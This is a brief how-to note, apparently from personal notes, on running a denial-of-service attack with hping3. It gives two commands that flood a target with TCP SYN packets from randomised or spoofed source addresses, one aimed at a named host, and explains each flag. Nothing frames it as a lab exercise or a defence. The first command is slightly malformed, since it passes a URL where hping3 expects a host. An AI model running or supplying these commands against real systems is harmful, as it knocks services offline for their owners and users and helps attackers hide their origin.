# DoS Attack with Hping3

Run this command
```
hping3 --flood -S --rand-source http://stv.com
```

Where:

`--flood` send packets as fast as possible

`-S` (Syn packet): legit TCP packet connection

`--rand-source` randomize the IP source address, like it's requested from different systems (sort of DDoS)

OR
```
sudo hping3 --flood -S -d 2000 -a <fake_ip> <target_ip>
```

Where:

parameter `-d` or `--data` to modify the weight of the sent data

`-a` or `--spoof` to use a single fake IP instead of multiple ones